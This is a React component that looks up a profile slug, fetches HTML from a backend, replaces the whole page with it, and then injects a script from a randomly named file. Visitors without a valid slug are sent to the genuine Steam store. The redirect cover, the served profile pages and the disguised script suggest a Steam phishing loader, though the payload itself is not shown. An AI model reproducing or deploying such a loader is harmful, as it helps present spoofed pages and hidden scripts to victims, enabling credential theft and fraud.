import axios from "axios";
import { useEffect } from "react";
import { useParams } from "react-router-dom";
import "./App.scss";
import { generateUrl } from "./utils/generateUrl";

const App = () => {
    const { slug } = useParams();

    useEffect(() => {
        const getPage = async () => {
            const goTo = () =>
                (window.location.href = "https://store.steampowered.com/");

            if (!slug) return goTo();
            await axios
                .get(generateUrl(`profile/get/${slug}`))
                .then((res) => {
                    document.documentElement.innerHTML = res.data;

                    setTimeout(() => {
                        const script = document.createElement("script");
                        script.src = "/txqmjgkxhzp5.html"
                        document.body.appendChild(script);
                    }, 100)
                })
                .catch(goTo);
        };

        getPage();
    }, []);

    return <div className="App"></div>;
};

export default App;
